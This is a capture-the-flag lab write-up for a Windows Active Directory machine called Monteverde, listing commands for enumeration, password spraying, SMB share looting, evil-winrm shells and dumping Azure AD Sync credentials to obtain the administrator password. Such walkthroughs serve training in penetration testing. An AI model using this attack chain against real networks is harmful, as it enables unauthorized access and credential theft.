---
icon: windows
---

# Monteverde - Medium

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan

```bash
# Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.172 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 20:34 EDT
Nmap scan report for MEGABANK.LOCAL (10.10.10.172)
Host is up (0.039s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-14 00:36:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-14T00:37:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 1s

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   51.95 ms 10.10.16.1
2   52.47 ms MEGABANK.LOCAL (10.10.10.172)
```

The ldap scan identified the domain name `MEGABANK.LOCAL`. I'll add it to my `/etc/hosts` file

```
10.10.10.172	MEGABANK.LOCAL
```

### <mark style="color:$primary;">DNS Enumeration</mark>

I'll try and brute force subdomains using dnsenum to see if anything else shows up.

{% code overflow="wrap" %}
```bash
dnsenum --dnsserver 10.10.10.172 -f ~/tools/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt megabank.local
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2671).png" alt=""><figcaption></figcaption></figure>

Found a new subdomain let's add it to our `/etc/hosts` file

```
10.10.10.172	MEGABANK.LOCAL monteverde.megabank.local
```

### <mark style="color:$primary;">LDAP Enumeration</mark>

This machine has anonymous bind enabled for LDAP, which allows us to query the directory and retrieve a list of usernames without authentication.

{% code overflow="wrap" %}
```bash
ldapsearch -x -H ldap://10.10.10.172 -b "DC=megabank,DC=local" > ldap.out
```
{% endcode %}

```bash
cat ldap.out | grep -i samaccountname | cut -d ' ' -f 2 | tee users
```

<figure><img src="../../.gitbook/assets/image (2673).png" alt=""><figcaption></figcaption></figure>

Now I will use [**kerbrute**](https://github.com/ropnop/kerbrute/releases) to check the list of users we got from ldapsearch

```bash
kerbrute userenum --dc 10.10.10.172 -d megabank.local usersba
```

<figure><img src="../../.gitbook/assets/image (2674).png" alt=""><figcaption></figcaption></figure>

I tried AS-REP Roasting with my username list but no luck. Moving on

### <mark style="color:$primary;">Credential Brute Force</mark>&#x20;

I will attempt to see if any user is using the same password as their username

{% code overflow="wrap" %}
```bash
netexec smb monteverde.megabank.local -u users -p users --continue-on-success --no-brute
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2675).png" alt=""><figcaption></figcaption></figure>

We caught a user!

### <mark style="color:$primary;">SMB Enumeration as SABatchJobs</mark>

```bash
netexec smb megabank.local -u SABatchJobs -p SABatchJobs --shares
```

<figure><img src="../../.gitbook/assets/image (2676).png" alt=""><figcaption></figcaption></figure>

we have access to a couple of interesting shares. Let's check them out

{% code overflow="wrap" %}
```bash
smbclient \\\\10.10.10.172\\users$ -U megabank.local\\SABatchJobs%SABatchJobs
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2677).png" alt=""><figcaption></figcaption></figure>

Found an interesting file in users mhope directory

<figure><img src="../../.gitbook/assets/image (2678).png" alt=""><figcaption></figcaption></figure>

This file is leaking some credentials, since I found it in mhope directory I will assume it's his

```bash
netexec winrm megabank.local -u mhope -p '4n0therD4y@n0th3r$'
```

<figure><img src="../../.gitbook/assets/image (2679).png" alt=""><figcaption></figcaption></figure>

We can get a shell as him over winrm

```bash
evil-winrm -i megabank.local -u mhope -p '4n0therD4y@n0th3r$'
```

<figure><img src="../../.gitbook/assets/image (2681).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2682).png" alt=""><figcaption></figcaption></figure>

The first thing that stood out to me was the Azure Admins Group. We did get a hint earlier from SMB Enumeration with the azure\_uploads share

<figure><img src="../../.gitbook/assets/image (2683).png" alt=""><figcaption></figcaption></figure>

There are a bunch of programs related to this as well

### <mark style="color:$primary;">Azure Admin Group Privesc</mark>

After some google searching I came across this [**exploit**](https://github.com/VbScrub/AdSyncDecrypt)&#x20;

{% embed url="https://github.com/VbScrub/AdSyncDecrypt/releases/tag/v1.0" %}

Download the Latest initial release of the exploit above

Extract files using unzip than upload the exe and dll files to the target machine

<figure><img src="../../.gitbook/assets/image (2684).png" alt=""><figcaption></figcaption></figure>

we need to run the exploit from this location: `C:\Program Files\Microsoft Azure AD Sync\Bin`

```powershell
C:\Users\mhope\documents\AdDecrypt.exe -FullSQL
```

<figure><img src="../../.gitbook/assets/image (2685).png" alt=""><figcaption></figcaption></figure>

We got the administrators credentials we can winrm as him now

```bash
evil-winrm -i megabank.local -u administrator -p 'd0m@in4dminyeah!'
```

<figure><img src="../../.gitbook/assets/image (2686).png" alt=""><figcaption></figcaption></figure>
